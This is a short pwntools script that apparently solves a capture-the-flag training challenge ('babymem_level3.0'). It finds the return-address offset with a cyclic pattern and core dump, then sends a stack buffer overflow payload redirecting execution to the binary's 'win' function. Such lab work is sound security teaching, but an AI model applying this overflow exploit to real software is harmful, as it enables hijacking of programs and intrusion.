#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level3.0')
io = elf.process(setuid=False)

# Send the payload size to the program in order 
# to compute the buffer size
io.recvuntil(b'Payload size: ')
io.sendline(f"{512}".encode())

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.recvuntil(b'bytes)!')
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run another program
io = elf.process()

# Send the payload size to the program
io.recvuntil(b'Payload size: ')
io.sendline(f"{buffer_length + 8}".encode())

# Build and send the payload to the program
# NOTE: elf.symbols.win returns the address of win function
PAYLOAD = b'A'*buffer_length + p64(elf.symbols.win)
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())
